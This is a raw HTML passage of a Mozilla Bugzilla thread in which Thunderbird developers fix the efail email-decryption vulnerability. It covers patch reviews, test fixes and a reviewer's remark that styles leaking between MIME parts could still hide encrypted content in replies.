        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-140" data-comment-id="13290772">(In reply to Jorg K (GMT+2) (bustage-fix only, NI for urgent reviews) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c139">comment #139</a>)
<span class="quote">&gt; Ben, I looked at the DOM for &quot;simple HTML&quot;. Sadly, that shows the same
&gt; problem. The text content is not inside the &lt;div&gt;, thus proper CSS isn't
&gt; applied. Richard, can you please confirm.</span >

Yes, I wrote in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c133">comment 133</a>: &quot;The problem is on HTML and Simple HTML&quot;. Both use the same class and the text is not inside the &lt;div&gt;.

BTW, what do you mean with: could you decode the message part?</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(richard.marti)</span></div></div></div><div class="change-set" id="c141"><div class="comment" data-id="13290774" data-no="141"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-141" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15321655_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-141"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-141" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c141">Comment 141</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 00:43 PDT" data-time="1526715784">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-141">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-141" data-comment-id="13290774">(In reply to Richard Marti (:Paenglab) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c140">comment #140</a>)
<span class="quote">&gt; Yes, I wrote in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c133">comment 133</a>: &quot;The problem is on HTML and Simple HTML&quot;. Both
&gt; use the same class and the text is not inside the &lt;div&gt;.</span >
Oops, missed that at 1:09 AM :-(

<span class="quote">&gt; BTW, what do you mean with: could you decode the message part?</span >
Sorry, &quot;decrypt&quot;. Did you see what you can see in <span class=""><a href="/attachment.cgi?id=8976711" name="attach_8976711" title="horizontal lines.png">attachment 8976711</a> <a href="/attachment.cgi?id=8976711&amp;action=edit" title="horizontal lines.png">[details]</a></span>: &quot;Hallo Jörg, ...&quot;.</pre></div><div class="change-set" id="c142"><div class="comment" data-id="13290792" data-no="142"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-142" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_282357" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/69a77b00400ed8b0e53e39c2c4789700?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_282357" id="a15321655_22599"><a class="email " href="/user_profile?user_id=282357" > <span class="fna">Richard Marti (:Paenglab)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-142"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-142" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c142">Comment 142</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 01:51 PDT" data-time="1526719888">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-142">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-142" data-comment-id="13290792">No, only the &quot;Please answer to...&quot; and two lines.</pre></div><div class="change-set" id="a15448251_176914"><div class="change" id="aa15448251_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15448251_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15448251_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15448251_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15448251_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15448251_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 02:45 PDT" data-time="1526723142">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">1462895</a></div></div></div><div class="change-set" id="c143"><div class="comment" data-id="13290882" data-no="143"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-143" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15448251_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15448251_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-143"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-143" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c143">Comment 143</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 04:38 PDT" data-time="1526729907">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-143">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-143" data-comment-id="13290882">Richard wrote:
<span class="quote">&gt; The message text isn't placed inside the moz-text-html class</span >

Ah, I see. Yes, that should be trivial to fix.

That code is already in the Normal HTML class. So, we need to either make sure to call the super function properly, I guess we simply don't do that, or we need to add corresponding code to the specialized classes.</pre></div><div class="change-set" id="c144"><div class="comment" data-id="13290901" data-no="144"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-144" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15448251_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15448251_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-144"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-144" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c144">Comment 144</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 05:16 PDT" data-time="1526732214">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-144">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-144" data-comment-id="13290901">Please fix it in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a>, then use that fix on your new parser class. I promise a very quick review in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a> and immediate landing if there are no test failures. The same goes for <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - HTML Sanitizer class cleanup"
   href="/show_bug.cgi?id=1462481">bug 1462481</a>. I trust I fixed your build problem also :-) (and all for free).</pre></div><div class="change-set" id="c145"><div class="comment" data-id="13291147" data-no="145"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-145" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15448251_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15448251_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-145"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-145" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c145">Comment 145</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 15:15 PDT" data-time="1526768132">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-145">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979059"
         class="attachment patch obsolete"
         data-id="8979059" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-parse-html-4.diff">
      <meta itemprop="contentSize" content="14337">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979059">
          <a class="link" href="attachment.cgi?id=8979059&amp;action=diff">
        <span id="att-8979059-description" itemprop="description">Separate MIME parts from each other, v4 (trunk only, with clean-up)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979059&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979059">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-145" data-comment-id="13291147">Since the little brother mimethsa.cpp just got a clean-up, I've done the same here (so we can stop the discussion and focus on the (severe) issue at hand). I've also removed the conditional compile code, since we won't land that on trunk. That will have to be restored for TB 60 and TB 52 but we cross that bridge when we get to it.

The test failures and the &quot;text outside div&quot; (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a>) are blocking this.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div><div class="change">
        <a href="/attachment.cgi?id=8979059&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk only, with clean-up)"
           class=""
        >Attachment #8979059</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c146"><div class="comment" data-id="13291182" data-no="146"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-146" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15448251_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15448251_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-146"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-146" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c146">Comment 146</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 16:41 PDT" data-time="1526773265">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-146">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-146" data-comment-id="13291182">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8979059" name="attach_8979059" title="Separate MIME parts from each other, v4 (trunk only, with clean-up)">attachment 8979059</a> <a href="/attachment.cgi?id=8979059&amp;action=edit" title="Separate MIME parts from each other, v4 (trunk only, with clean-up)">[details]</a> <a href="/attachment.cgi?id=8979059&amp;action=diff" title="Separate MIME parts from each other, v4 (trunk only, with clean-up)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979059'>[review]</a>
Separate MIME parts from each other, v4 (trunk only, with clean-up)

r+ conditional on fixing <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a>.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979059&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk only, with clean-up)"
           class=""
        >Attachment #8979059</a> -
        Flags: review+</div></div></div><div class="change-set" id="c147"><div class="comment" data-id="13291185" data-no="147"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-147" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15448251_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15448251_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-147"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-147" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c147">Comment 147</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 16:43 PDT" data-time="1526773418">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-147">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979060"
         class="attachment patch obsolete"
         data-id="8979060" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1419417-fix-tests.patch">
      <meta itemprop="contentSize" content="4550">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979060">
          <a class="link" href="attachment.cgi?id=8979060&amp;action=diff">
        <span id="att-8979060-description" itemprop="description">1419417-fix-tests.patch</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979060&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979060">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-147" data-comment-id="13291185">This fixes the tests.

Let's be sure and do another try:
<a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&amp;revision=5f2ef8a7ecf069d845d368ecf2f068ceb8fadd53">https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&amp;revision=5f2ef8a7ecf069d845d368ecf2f068ceb8fadd53</a></pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979060&amp;action=edit"
           title="1419417-fix-tests.patch"
           class=""
        >Attachment #8979060</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c148"><div class="comment" data-id="13291187" data-no="148"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-148" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15448251_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15448251_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-148"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-148" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c148">Comment 148</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 16:58 PDT" data-time="1526774335">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-148">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979061"
         class="attachment patch obsolete"
         data-id="8979061" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1419417-fix-tests.patch">
      <meta itemprop="contentSize" content="4654">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979061">
          <a class="link" href="attachment.cgi?id=8979061&amp;action=diff">
        <span id="att-8979061-description" itemprop="description">1419417-fix-tests.patch (v2)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979061&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979061">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-148" data-comment-id="13291187">Different platforms have different line endings, so this only worked on Windows. The new version should work everywhere.

<a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&amp;revision=1ce20ed3e47d9df8c5fbe68033bc628951b7b9f7">https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&amp;revision=1ce20ed3e47d9df8c5fbe68033bc628951b7b9f7</a></pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979060&amp;action=edit"
           title="1419417-fix-tests.patch"
           class=""
        >Attachment #8979060</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8979060&amp;action=edit"
           title="1419417-fix-tests.patch"
           class=""
        >Attachment #8979060</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div><div class="change">
        <a href="/attachment.cgi?id=8979061&amp;action=edit"
           title="1419417-fix-tests.patch (v2)"
           class=""
        >Attachment #8979061</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c149"><div class="comment" data-id="13291193" data-no="149"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-149" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15448251_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15448251_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-149"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-149" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c149">Comment 149</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 17:20 PDT" data-time="1526775652">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-149">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979062"
         class="attachment patch"
         data-id="8979062" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1419417-remove-monkey-patch.patch">
      <meta itemprop="contentSize" content="1090">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979062">
          <a class="link" href="attachment.cgi?id=8979062&amp;action=diff">
        <span id="att-8979062-description" itemprop="description">1419417-remove-monkey-patch.patch</span></a>
        — <a href="attachment.cgi?id=8979062&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979062">Splinter Review</a>
      </div>
    </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979062&amp;action=edit"
           title="1419417-remove-monkey-patch.patch"
           class=""
        >Attachment #8979062</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c150"><div class="comment" data-id="13291602" data-no="150"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-150" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15448251_176914"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15448251_176914"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-150"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-150" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c150">Comment 150</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 13:21 PDT" data-time="1526847693">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-150">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-150" data-comment-id="13291602">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8979059" name="attach_8979059" title="Separate MIME parts from each other, v4 (trunk only, with clean-up)">attachment 8979059</a> <a href="/attachment.cgi?id=8979059&amp;action=edit" title="Separate MIME parts from each other, v4 (trunk only, with clean-up)">[details]</a> <a href="/attachment.cgi?id=8979059&amp;action=diff" title="Separate MIME parts from each other, v4 (trunk only, with clean-up)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979059'>[review]</a>
Separate MIME parts from each other, v4 (trunk only, with clean-up)

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8979059" name="attach_8979059" title="Separate MIME parts from each other, v4 (trunk only, with clean-up)">attachment 8979059</a> <a href="/attachment.cgi?id=8979059&amp;action=edit" title="Separate MIME parts from each other, v4 (trunk only, with clean-up)">[details]</a> <a href="/attachment.cgi?id=8979059&amp;action=diff" title="Separate MIME parts from each other, v4 (trunk only, with clean-up)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979059'>[review]</a>:
-----------------------------------------------------------------

r=mkmelin with the below adressed.

Sadly, this is a required step to prevent efail, but this is not fixing it for reply/fwd. 
I thought earlier just converting to plain text would fix that, and it would mitigate for sure. But thinking about that some more, you could put enough newlines to push the content out of view then. 
When using html, even with this patch, styles leak over between parts and can hide the content of the encrypted part so you would't see it when composing (either).

::: mailnews/mime/src/mimeTextHTMLParsed.cpp
&#64;&#64; +71,5 &#64;&#64;
<span class="quote">&gt; +    PR_Free(content_type);
&gt; +    if (charset)
&gt; +    {
&gt; +      nsAutoCString charsetline(
&gt; +        &quot;\n&lt;meta http-equiv=\&quot;Context-Type\&quot; content=\&quot;text/html; charset=&quot;);</span >

I believe this is wrong (and at this point no content type should be output). Haven't checked if it's just ignored or would cause problems.
The second one of the  &lt;meta http-equiv=&quot;Context-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;,  didn't use to appear. We just had two earlier :-p

When replying at least to an encrypted msg, I get this - notice, there's three http-equivs

&lt;html&gt;
  &lt;head&gt;
    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
  &lt;/head&gt;
  &lt;body text=&quot;#000000&quot; bgcolor=&quot;#FFFFFF&quot;&gt;
    xyz&lt;br&gt;
    &lt;br&gt;
    &lt;div class=&quot;moz-cite-prefix&quot;&gt;On 4/19/18 11:27 PM, Magnus Melin
      wrote:&lt;br&gt;
    &lt;/div&gt;
    &lt;blockquote type=&quot;cite&quot;
      cite=&quot;<a rel="nofollow" href="mid:79777860-fbab-4c85-9885-42936cadc71c&#64;netti.fi">mid:79777860-fbab-4c85-9885-42936cadc71c&#64;netti.fi</a>&quot;&gt;
      &lt;meta http-equiv=&quot;Context-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
      &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
      Heyheyhey!&lt;br&gt;
      &lt;br&gt;

&#64;&#64; +100,5 &#64;&#64;
<span class="quote">&gt; +
&gt; +  // We have to cache all lines and parse the whole document at once.
&gt; +  // There's a useful sounding function parseFromStream(), but it only allows XML
&gt; +  // mimetypes, not HTML. Methinks that's because the HTML soup parser
&gt; +  // needs the entire doc to make sense of the glibberish that people write.</span >

gibberish</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979059&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk only, with clean-up)"
           class=""
        >Attachment #8979059</a> -
        Flags: review?(mkmelin+mozilla) &rarr; review+</div></div></div><div class="change-set" id="a15572834_101158"><div class="change" id="aa15572834_101158">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15572834_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_101158" id="a15572834_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15572834_101158"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
